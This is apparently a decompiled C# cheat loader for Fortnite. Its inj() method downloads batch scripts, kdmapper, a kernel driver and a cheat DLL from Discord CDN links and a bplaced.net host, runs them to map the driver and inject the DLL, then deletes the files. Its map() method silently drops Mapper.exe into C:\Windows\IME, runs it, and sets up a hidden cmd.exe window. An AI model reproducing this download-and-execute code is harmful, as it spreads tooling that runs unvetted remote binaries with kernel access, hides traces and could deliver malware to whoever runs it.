using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Cheat_Loader_ION_FN
{
	// Token: 0x02000002 RID: 2
	internal class Class1
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static void inj()
		{
			Console.ForegroundColor = ConsoleColor.Cyan;
			WebClient webClient = new WebClient();
			Directory.CreateDirectory("C:\\Cheat\\");
			string text = "C:\\Cheat\\mapdriver.bat";
			string text2 = "C:\\Cheat\\inject.bat";
			string text3 = "C:\\Cheat\\kdmapper.exe";
			string text4 = "C:\\Cheat\\modmap.exe";
			string text5 = "C:\\Cheat\\Fortnite.dll";
			string text6 = "C:\\Cheat\\driver.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/744746937080742018/744762782913789962/MapDriver.bat", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/744746937080742018/744762779323334719/inject.bat", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/744746937080742018/744747057805393930/kdmapper.exe", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/744746937080742018/744747059940294656/modmap.exe", text4);
			webClient.DownloadFile("http://ion-fn.bplaced.net/fnhack/Fortnite.dll", text5);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/744746937080742018/744747060359856229/driver.sys", text6);
			Process process = new Process();
			Thread.Sleep(3000);
			process.Close();
			Console.Clear();
			Console.WriteLine("[+] Mapped");
			Process.Start(text);
			Thread.Sleep(4000);
			Console.WriteLine("[+] Open Fortnite");
			Console.WriteLine("[+] Press F2 In Lobby");
			Console.ReadLine();
			Process.Start(text2);
			Thread.Sleep(4000);
			Console.WriteLine("[+] Injected");
			File.Delete(text);
			File.Delete(text2);
			File.Delete(text3);
			File.Delete(text4);
			File.Delete(text5);
			File.Delete(text6);
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002174 File Offset: 0x00000374
		public static void map()
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\IME\\Mapper.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/730958976287768576/747243218621562930/Mapper.exe", fileName);
			Process.Start(fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		}
	}
}
